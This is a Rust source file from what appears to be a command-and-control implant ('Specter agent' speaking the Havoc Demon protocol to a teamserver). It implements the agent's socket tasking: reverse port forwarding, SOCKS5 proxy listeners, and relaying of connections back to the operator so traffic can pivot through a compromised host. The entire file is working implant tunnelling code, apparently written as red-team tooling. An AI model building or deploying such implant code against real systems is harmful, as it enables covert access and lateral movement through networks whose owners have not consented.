//! `SocketState` struct and dispatch/polling methods.
//!
//! Command handler methods (`handle_rportfwd_*`, `handle_socks_*`, `handle_socket_*`,
//! `write_to_socket`) live in the `command_handlers` child module.

use std::collections::HashMap;
use std::io::{ErrorKind, Read};

use red_cell_common::demon::{DemonCommand, DemonSocketCommand, DemonSocketType};
use tracing::warn;

use crate::dispatch::Response;

use super::socket_io::{
    SOCKS_METHOD_NO_AUTH, SOCKS_REPLY_ADDRESS_TYPE_NOT_SUPPORTED,
    SOCKS_REPLY_COMMAND_NOT_SUPPORTED, SOCKS_REPLY_GENERAL_FAILURE, SOCKS_REPLY_SUCCEEDED,
    SOCKS_VERSION, SocksRequestError, connect_ipv4_target, connect_socks_target,
    encode_rportfwd_remove, encode_socket_close, encode_socket_open, encode_socket_read_failure,
    encode_socket_read_success, parse_u32_le, pump_stream, raw_socket_error, read_available,
    send_socks_reply, try_parse_socks_greeting, try_parse_socks_request, write_all_nonblocking,
};
use super::types::{
    LocalRelayConnection, ManagedSocket, PendingSocketResponse, ReversePortForward,
    ReversePortForwardMode, SocksClient, SocksClientState, SocksProxy,
};

// ─── Registry state ─────────────────────────────────────────────────────────

/// All socket-related state for the Specter agent.
#[derive(Debug, Default)]
pub struct SocketState {
    reverse_port_forwards: HashMap<u32, ReversePortForward>,
    socks_proxies: HashMap<u32, SocksProxy>,
    sockets: HashMap<u32, ManagedSocket>,
    local_relays: HashMap<u32, LocalRelayConnection>,
    socks_clients: HashMap<u32, SocksClient>,
    pending_responses: Vec<PendingSocketResponse>,
}

// ─── Error type ─────────────────────────────────────────────────────────────

/// Errors that can occur during socket operations.
#[derive(Debug, thiserror::Error)]
pub enum SocketError {
    /// A parse error occurred reading the task payload.
    #[error("socket parse error: {0}")]
    Parse(&'static str),

    /// An I/O error occurred on a socket operation.
    #[error("socket I/O error: {0}")]
    Io(String),
}

// ─── Command handler methods (child module) ──────────────────────────────────

#[path = "command_handlers.rs"]
mod command_handlers;

// ─── SocketState implementation ─────────────────────────────────────────────

impl SocketState {
    /// Create a new empty socket state.
    pub fn new() -> Self {
        Self::default()
    }

    /// Handle an incoming `CommandSocket` task from the teamserver.
    ///
    /// Parses the subcommand and dispatches to the appropriate handler.
    /// Some subcommands (like `Connect`) require async I/O, so this method
    /// is async.
    pub async fn handle_command(
        &mut self,
        request_id: u32,
        payload: &[u8],
    ) -> Result<(), SocketError> {
        let mut offset = 0;
        let subcommand_raw = parse_u32_le(payload, &mut offset)?;
        let subcommand = DemonSocketCommand::try_from(subcommand_raw)
            .map_err(|_| SocketError::Parse("unknown socket subcommand"))?;

        let rest = &payload[offset..];

        match subcommand {
            DemonSocketCommand::ReversePortForwardAdd => {
                self.handle_rportfwd_add(request_id, rest, ReversePortForwardMode::Teamserver)?;
            }
            DemonSocketCommand::ReversePortForwardAddLocal => {
                self.handle_rportfwd_add(request_id, rest, ReversePortForwardMode::Local)?;
            }
            DemonSocketCommand::ReversePortForwardList => {
                self.handle_rportfwd_list(request_id);
            }
            DemonSocketCommand::ReversePortForwardClear => {
                self.handle_rportfwd_clear(request_id);
            }
            DemonSocketCommand::ReversePortForwardRemove => {
                self.handle_rportfwd_remove(request_id, rest)?;
            }
            DemonSocketCommand::SocksProxyAdd => {
                self.handle_socks_proxy_add(request_id, rest)?;
            }
            DemonSocketCommand::SocksProxyList => {
                self.handle_socks_proxy_list(request_id);
            }
            DemonSocketCommand::SocksProxyRemove => {
                self.handle_socks_proxy_remove(request_id, rest)?;
            }
            DemonSocketCommand::SocksProxyClear => {
                self.handle_socks_proxy_clear(request_id);
            }
            DemonSocketCommand::Open => {
                warn!("socket open is a callback-only path — ignoring");
            }
            DemonSocketCommand::Read => {
                self.handle_socket_read(request_id, rest)?;
            }
            DemonSocketCommand::Write => {
                self.handle_socket_write(request_id, rest)?;
            }
            DemonSocketCommand::Close => {
                self.handle_socket_close(rest)?;
            }
            DemonSocketCommand::Connect => {
                self.handle_socket_connect(request_id, rest).await?;
            }
        }

        Ok(())
    }

    /// Poll all active sockets, listeners, and relays for pending I/O.
    ///
    /// Must be called periodically from the agent run loop. Returns any
    /// responses that need to be sent to the teamserver.
    pub async fn poll(&mut self) -> Result<(), SocketError> {
        self.accept_reverse_port_forward_clients().await?;
        self.accept_socks_proxy_clients()?;
        self.poll_sockets()?;
        self.poll_local_relays();
        self.poll_socks_clients().await?;
        Ok(())
    }

    /// Drain all pending responses queued during `handle_command()` and `poll()`.
    pub fn drain_responses(&mut self) -> Vec<Response> {
        self.pending_responses
            .drain(..)
            .map(|r| Response {
                command_id: u32::from(DemonCommand::CommandSocket),
                request_id: r.request_id,
                payload: r.payload,
            })
            .collect()
    }

    /// Returns `true` if there are active sockets, listeners, or relays that
    /// need periodic polling.
    pub fn has_active_connections(&self) -> bool {
        !self.reverse_port_forwards.is_empty()
            || !self.socks_proxies.is_empty()
            || !self.sockets.is_empty()
            || !self.local_relays.is_empty()
            || !self.socks_clients.is_empty()
    }

    // ─── Shared helpers (called from both command handlers and polling) ───────

    pub(super) fn queue_response(&mut self, request_id: u32, payload: Vec<u8>) {
        self.pending_responses.push(PendingSocketResponse { request_id, payload });
    }

    pub(super) fn allocate_socket_id(&self) -> u32 {
        let mut socket_id = (rand::random::<u32>() & 0x7FFF_FFFF) | 1;
        while self.sockets.contains_key(&socket_id)
            || self.reverse_port_forwards.contains_key(&socket_id)
            || self.socks_proxies.contains_key(&socket_id)
            || self.local_relays.contains_key(&socket_id)
            || self.socks_clients.contains_key(&socket_id)
        {
            socket_id = (rand::random::<u32>() & 0x7FFF_FFFF) | 1;
        }
        socket_id
    }

    fn remove_socket(&mut self, socket_id: u32) {
        let Some(socket) = self.sockets.remove(&socket_id) else {
            return;
        };

        let payload = match socket.socket_type {
            DemonSocketType::Client | DemonSocketType::ReversePortForward => {
                encode_rportfwd_remove(
                    socket_id,
                    socket.socket_type,
                    socket.bind_addr,
                    socket.bind_port,
                    socket.forward_addr,
                    socket.forward_port,
                )
            }
            DemonSocketType::ReverseProxy => {
                encode_socket_close(socket_id, DemonSocketType::ReverseProxy)
            }
        };

        self.queue_response(0, payload);
    }

    fn remove_reverse_port_forward(&mut self, socket_id: u32) {
        let Some(listener) = self.reverse_port_forwards.remove(&socket_id) else {
            return;
        };

        // Remove all client sockets associated with this listener.
        let client_ids: Vec<u32> = self
            .sockets
            .iter()
            .filter_map(|(client_id, socket)| {
                (socket.socket_type == DemonSocketType::Client
                    && socket.bind_addr == listener.bind_addr
                    && socket.bind_port == listener.bind_port
                    && socket.forward_addr == listener.forward_addr
                    && socket.forward_port == listener.forward_port)
                    .then_some(*client_id)
            })
            .collect();
        for client_id in client_ids {
            self.remove_socket(client_id);
        }

        // Remove all local relays associated with this listener.
        let relay_ids: Vec<u32> = self
            .local_relays
            .iter()
            .filter_map(|(relay_id, relay)| (relay.parent_id == socket_id).then_some(*relay_id))
            .collect();
        for relay_id in relay_ids {
            self.local_relays.remove(&relay_id);
        }

        self.queue_response(
            0,
            encode_rportfwd_remove(
                socket_id,
                DemonSocketType::ReversePortForward,
                listener.bind_addr,
                listener.bind_port,
                listener.forward_addr,
                listener.forward_port,
            ),
        );
    }

    // ─── Polling helpers ────────────────────────────────────────────────────

    async fn accept_reverse_port_forward_clients(&mut self) -> Result<(), SocketError> {
        let listener_ids: Vec<u32> = self.reverse_port_forwards.keys().copied().collect();
        let mut accepted = Vec::new();

        for listener_id in listener_ids {
            let Some(listener) = self.reverse_port_forwards.get(&listener_id) else {
                continue;
            };

            loop {
                match listener.listener.accept() {
                    Ok((stream, _peer)) => {
                        stream.set_nonblocking(true).map_err(|e| SocketError::Io(e.to_string()))?;
                        accepted.push((
                            listener_id,
                            listener.mode,
                            listener.bind_addr,
                            listener.bind_port,
                            listener.forward_addr,
                            listener.forward_port,
                            stream,
                        ));
                    }
                    Err(e) if e.kind() == ErrorKind::WouldBlock => break,
                    Err(e) => return Err(SocketError::Io(e.to_string())),
                }
            }
        }

        for (listener_id, mode, bind_addr, bind_port, forward_addr, forward_port, stream) in
            accepted
        {
            match mode {
                ReversePortForwardMode::Teamserver => {
                    let socket_id = self.allocate_socket_id();
                    self.sockets.insert(
                        socket_id,
                        ManagedSocket {
                            stream,
                            socket_type: DemonSocketType::Client,
                            bind_addr,
                            bind_port,
                            forward_addr,
                            forward_port,
                        },
                    );
                    self.queue_response(
                        0,
                        encode_socket_open(
                            socket_id,
                            bind_addr,
                            bind_port,
                            forward_addr,
                            forward_port,
                        ),
                    );

                    if !self.reverse_port_forwards.contains_key(&listener_id) {
                        self.remove_socket(socket_id);
                    }
                }
                ReversePortForwardMode::Local => {
                    if !self.reverse_port_forwards.contains_key(&listener_id) {
                        continue;
                    }
                    if let Ok(target) = connect_ipv4_target(forward_addr, forward_port as u16).await
                    {
                        self.local_relays.insert(
                            self.allocate_socket_id(),
                            LocalRelayConnection {
                                left: stream,
                                right: target,
                                parent_id: listener_id,
                            },
                        );
                    }
                }
            }
        }

        Ok(())
    }

    fn accept_socks_proxy_clients(&mut self) -> Result<(), SocketError> {
        let server_ids: Vec<u32> = self.socks_proxies.keys().copied().collect();
        let mut accepted = Vec::new();

        for server_id in server_ids {
            let Some(proxy) = self.socks_proxies.get(&server_id) else {
                continue;
            };

            loop {
                match proxy.listener.accept() {
                    Ok((stream, _peer)) => {
                        stream.set_nonblocking(true).map_err(|e| SocketError::Io(e.to_string()))?;
                        accepted.push((server_id, stream));
                    }
                    Err(e) if e.kind() == ErrorKind::WouldBlock => break,
                    Err(e) => return Err(SocketError::Io(e.to_string())),
                }
            }
        }

        for (server_id, stream) in accepted {
            if !self.socks_proxies.contains_key(&server_id) {
                continue;
            }
            self.socks_clients.insert(
                self.allocate_socket_id(),
                SocksClient {
                    stream,
                    server_id,
                    state: SocksClientState::Greeting { buffer: Vec::new() },
                },
            );
        }

        Ok(())
    }

    fn poll_sockets(&mut self) -> Result<(), SocketError> {
        let socket_ids: Vec<u32> = self.sockets.keys().copied().collect();
        let mut removals = Vec::new();

        for socket_id in socket_ids {
            let mut read_failure = None;
            let mut read_success = None;

            {
                let Some(socket) = self.sockets.get_mut(&socket_id) else {
                    continue;
                };

                let mut data = Vec::new();
                let mut buffer = [0_u8; 4096];

                loop {
                    match socket.stream.read(&mut buffer) {
                        Ok(0) => {
                            removals.push(socket_id);
                            break;
                        }
                        Ok(read) => data.extend_from_slice(&buffer[..read]),
                        Err(e) if e.kind() == ErrorKind::WouldBlock => break,
                        Err(e) => {
                            read_failure = Some(encode_socket_read_failure(
                                socket_id,
                                socket.socket_type,
                                raw_socket_error(&e),
                            ));
                            removals.push(socket_id);
                            break;
                        }
                    }
                }

                if !data.is_empty() {
                    match encode_socket_read_success(socket_id, socket.socket_type, &data) {
                        Ok(payload) => read_success = Some(payload),
                        Err(e) => {
                            warn!(socket_id, error = %e, "failed to encode socket read success");
                            removals.push(socket_id);
                        }
                    }
                }
            }

            if let Some(payload) = read_failure {
                self.queue_response(0, payload);
            }
            if let Some(payload) = read_success {
                self.queue_response(0, payload);
            }
        }

        for socket_id in removals {
            self.remove_socket(socket_id);
        }

        Ok(())
    }

    fn poll_local_relays(&mut self) {
        let relay_ids: Vec<u32> = self.local_relays.keys().copied().collect();
        let mut removals = Vec::new();

        for relay_id in relay_ids {
            let Some(relay) = self.local_relays.get_mut(&relay_id) else {
                continue;
            };

            let left_result = pump_stream(&mut relay.left, &mut relay.right);
            let right_result = pump_stream(&mut relay.right, &mut relay.left);
            if left_result || right_result {
                removals.push(relay_id);
            }
        }

        for relay_id in removals {
            self.local_relays.remove(&relay_id);
        }
    }

    async fn poll_socks_clients(&mut self) -> Result<(), SocketError> {
        let client_ids: Vec<u32> = self.socks_clients.keys().copied().collect();
        let mut removals = Vec::new();

        for client_id in client_ids {
            let Some(client) = self.socks_clients.get_mut(&client_id) else {
                continue;
            };

            match &mut client.state {
                SocksClientState::Greeting { buffer } => {
                    let closed = read_available(&mut client.stream, buffer)?;
                    if closed {
                        removals.push(client_id);
                        continue;
                    }

                    match try_parse_socks_greeting(buffer) {
                        None => {}
                        Some(Ok(consumed)) => {
                            let remainder = buffer.split_off(consumed);
                            if write_all_nonblocking(
                                &mut client.stream,
                                &[SOCKS_VERSION, SOCKS_METHOD_NO_AUTH],
                            )
                            .is_err()
                            {
                                removals.push(client_id);
                                continue;
                            }
                            client.state = SocksClientState::Request { buffer: remainder };
                        }
                        Some(Err(method)) => {
                            let _ =
                                write_all_nonblocking(&mut client.stream, &[SOCKS_VERSION, method]);
                            removals.push(client_id);
                        }
                    }
                }
                SocksClientState::Request { buffer } => {
                    let closed = read_available(&mut client.stream, buffer)?;
                    if closed {
                        removals.push(client_id);
                        continue;
                    }

                    match try_parse_socks_request(buffer) {
                        None => {}
                        Some(Ok((consumed, request))) => {
                            let remainder = buffer.split_off(consumed);
                            match connect_socks_target(request.atyp, &request.address, request.port)
                                .await
                            {
                                Ok(mut target) => {
                                    if send_socks_reply(
                                        &mut client.stream,
                                        SOCKS_REPLY_SUCCEEDED,
                                        request.atyp,
                                        &request.address,
                                        request.port,
                                    )
                                    .is_err()
                                    {
                                        removals.push(client_id);
                                        continue;
                                    }
                                    if !remainder.is_empty()
                                        && write_all_nonblocking(&mut target, &remainder).is_err()
                                    {
                                        removals.push(client_id);
                                        continue;
                                    }
                                    client.state = SocksClientState::Relay { target };
                                }
                                Err(_error_code) => {
                                    let _ = send_socks_reply(
                                        &mut client.stream,
                                        SOCKS_REPLY_GENERAL_FAILURE,
                                        request.atyp,
                                        &request.address,
                                        request.port,
                                    );
                                    removals.push(client_id);
                                }
                            }
                        }
                        Some(Err(error)) => {
                            let reply = match error {
                                SocksRequestError::GeneralFailure => SOCKS_REPLY_GENERAL_FAILURE,
                                SocksRequestError::CommandNotSupported => {
                                    SOCKS_REPLY_COMMAND_NOT_SUPPORTED
                                }
                                SocksRequestError::AddressTypeNotSupported => {
                                    SOCKS_REPLY_ADDRESS_TYPE_NOT_SUPPORTED
                                }
                            };
                            let _ = write_all_nonblocking(
                                &mut client.stream,
                                &[SOCKS_VERSION, reply, 0, 1, 0, 0, 0, 0, 0, 0],
                            );
                            removals.push(client_id);
                        }
                    }
                }
                SocksClientState::Relay { target } => {
                    let client_failed = pump_stream(&mut client.stream, target);
                    let target_failed = pump_stream(target, &mut client.stream);
                    if client_failed || target_failed {
                        removals.push(client_id);
                    }
                }
            }
        }

        for client_id in removals {
            self.socks_clients.remove(&client_id);
        }

        Ok(())
    }
}
